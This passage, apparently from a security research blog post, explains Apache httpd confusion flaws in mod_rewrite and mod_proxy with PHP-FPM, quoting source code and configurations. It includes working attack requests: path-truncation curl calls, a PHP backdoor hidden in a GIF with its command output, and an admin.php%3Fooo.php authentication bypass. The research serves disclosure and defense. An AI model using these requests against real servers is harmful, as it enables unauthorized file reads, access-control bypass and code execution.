&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this “convenience” also introduces risks. For instance, &lt;strong&gt;while rewriting the target paths, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcefully treats all results as a URL&lt;/strong&gt;, truncating the path after a question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt;. This leads to the following two exploitations.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-1-1-1-path-truncation&quot;&gt;✔️ 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;The first primitive leverages this truncation on the filesystem path. Imagine the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The server would open the corresponding profile based on the username followed by the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt;, for example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt;, like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is our first primitive — Path Truncation. Let’s pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember it— it will reappear in later attacks, gradually tearing open this seemingly little breach! 😜&lt;/p&gt;

&lt;h5 id=&quot;️-1-1-2-mislead-rewriteflag-assignment&quot;&gt;✔️ 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;The second exploitation of the truncation primitive is to mislead the assignment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlags&lt;/code&gt;. Imagine a sysadmin managing websites and their corresponding handlers through the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If a request ends with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension, it adds the corresponding handler for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; (this can also be an Environment Variable or Content-Type; you can refer to the official &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt; manual for details).&lt;/p&gt;

&lt;p&gt;Since the truncation behavior of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldn’t apply to by using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-1-2-acl-bypass&quot;&gt;⚔️ Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;The second primitive of Filename Confusion occurs in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;. Unlike the previous primitive which treats targets as a URL in all cases, this time &lt;strong&gt;the authentication and access control bypass is caused by the inconsistent semantic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; among the modules!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It actually makes sense for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL, given that the primary  purpose of a Proxy is to “redirect” requests to other URLs. However, security issues when different components interact — especially the case when most modules by default treat the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path, imagine you use a file-based access control, and now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL; this inconsistency can lead to the access control or authentication bypass!&lt;/p&gt;

&lt;p&gt;A classic example is when sysadmins use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive to restrict a single file, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This type of configuration can be bypassed directly under the default PHP-FPM installation! It’s also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt;, which obviously does not match &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; directive:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; will rewrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; to the following URL and call the sub-module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; to handle the subsequent FastCGI protocol:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, PHP-FPM first normalizes the filename and splits it at the question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; to extract the actual file path for execution (which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;). This leads to the bypass, and basically, &lt;strong&gt;all authentications or access controls based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive for a single PHP file are at risk when running together with PHP-FPM!&lt;/strong&gt; 😮&lt;/p&gt;

&lt;p&gt;Many potentially risky configurations can be found on GitHub, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; restricted to internal network access only:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adminer blocked by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
